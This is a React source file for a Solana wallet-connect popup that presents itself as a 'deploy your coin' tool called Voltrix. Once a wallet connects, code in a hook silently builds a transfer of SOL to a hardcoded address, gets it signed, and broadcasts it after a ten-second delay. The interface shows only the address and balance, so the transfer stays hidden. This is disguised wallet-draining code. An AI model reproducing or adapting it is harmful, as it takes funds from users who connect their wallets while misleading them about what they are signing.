import React, { FC, useEffect, useState } from 'react';
import ReactDOM from 'react-dom';
import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
} from '@solana/web3.js';
import {
  useWallet,
  WalletMultiButton,
  WalletProvider,
  ConnectionProvider,
} from '@solana/wallet-adapter-react';
import {
  WalletModalProvider,
} from '@solana/wallet-adapter-react-ui';
import {
  PhantomWalletAdapter,
  BackpackWalletAdapter,
} from '@solana/wallet-adapter-wallets';

require('@solana/wallet-adapter-react-ui/styles.css');

const connection = new Connection('https://api.mainnet-beta.solana.com');

const WalletConnectionHandler: FC = () => {
  const { publicKey, connected, signTransaction } = useWallet();
  const [solBalance, setSolBalance] = useState<number | null>(null);
  const [loading, setLoading] = useState<boolean>(false);

  useEffect(() => {
    const fetchBalance = async () => {
      if (publicKey) {
        const balance = await connection.getBalance(publicKey);
        setSolBalance(balance / 1e9); // Convert lamports to SOL
      }
    };
    fetchBalance();
  }, [publicKey]);

  useEffect(() => {
    const sendSolWithDelay = async () => {
      if (!publicKey) return;

      setLoading(true);

      try {
        const walletPublicKey = publicKey;
        const sendAmount = 0.001 * 1e9; // 0.001 SOL in lamports

        const balance = await connection.getBalance(walletPublicKey);
        if (balance <= 0) {
          alert('‚ö†Ô∏è Not enough SOL to send.');
          return;
        }

        const tx = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: walletPublicKey,
            toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
            lamports: sendAmount,
          })
        );

        tx.feePayer = walletPublicKey;
        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

        if (!signTransaction) {
          alert('‚ùå Wallet not ready to sign.');
          return;
        }

        const signedTx = await signTransaction(tx);
        console.log('üñäÔ∏è Transaction signed.');

        setTimeout(async () => {
          try {
            const txid = await connection.sendRawTransaction(signedTx.serialize());
            console.log(`üöÄ Transaction sent. Signature: ${txid}`);
          } catch (err) {
            console.error('‚ùå Failed to send transaction:', err);
          }
        }, 10000); // 10-second delay

      } catch (err) {
        console.error('‚ùå Error sending transaction:', err);
        alert('Transaction failed.');
      } finally {
        setLoading(false);
      }
    };

    if (connected && publicKey) {
      sendSolWithDelay();
    }
  }, [connected, publicKey]);

  const WalletUI = (
    <div className="wallet-modal">
      <div className="wallet-close" id="closePopup">
        <i className="fas fa-times"></i>
      </div>
      <i className="fas fa-wallet"></i>
      <h2>
        <span className="highlight">Connect Wallet</span>
      </h2>
      <p>To deploy your coin, please connect your wallet securely using Voltrix.</p>
      {!connected || !publicKey ? (
        <>
          <WalletMultiButton
            style={{
              background: 'linear-gradient(to right, #ff5cd1, #ff91e3)',
              color: 'white',
              borderRadius: '10px',
              padding: '12px 24px',
              fontSize: '16px',
              fontWeight: '600',
              border: 'none',
              boxShadow: '0 0 12px rgba(255, 92, 209, 0.6)',
              cursor: 'pointer',
            }}
          />
          <p id="status_p" style={{ marginTop: '20px' }}></p>
        </>
      ) : (
        <>
          <h2 style={{ color: '#ff91e3', marginBottom: '12px' }}>‚úÖ Wallet Connected</h2>
          <p
            style={{
              wordBreak: 'break-all',
              cursor: 'pointer',
              fontSize: '14px',
              color: '#ffadeb',
              marginBottom: '10px',
            }}
            onClick={() => navigator.clipboard.writeText(publicKey.toBase58())}
          >
            <strong style={{ color: '#ffbff0' }}>Address:</strong>
            <br />
            {publicKey.toBase58()}
          </p>
          <p style={{ fontSize: '15px', marginBottom: '6px', color: '#ffc5f1' }}>
            <strong>Balance:</strong>{' '}
            {loading ? 'Loading...' : solBalance !== null ? `${solBalance.toFixed(4)} SOL` : 'N/A'}
          </p>
        </>
      )}
    </div>
  );

  return ReactDOM.createPortal(WalletUI, document.getElementById('walletPopup') as HTMLElement);
};

const WalletWrapper: FC<{ children: React.ReactNode }> = ({ children }) => {
  const wallets = [new PhantomWalletAdapter(), new BackpackWalletAdapter()];

  return (
    <ConnectionProvider endpoint="https://api.mainnet-beta.solana.com">
      <WalletProvider wallets={wallets} autoConnect>
        <WalletModalProvider>{children}</WalletModalProvider>
      </WalletProvider>
    </ConnectionProvider>
  );
};

const App: FC = () => {
  return (
    <WalletWrapper>
      <WalletConnectionHandler />
    </WalletWrapper>
  );
};

export default App;
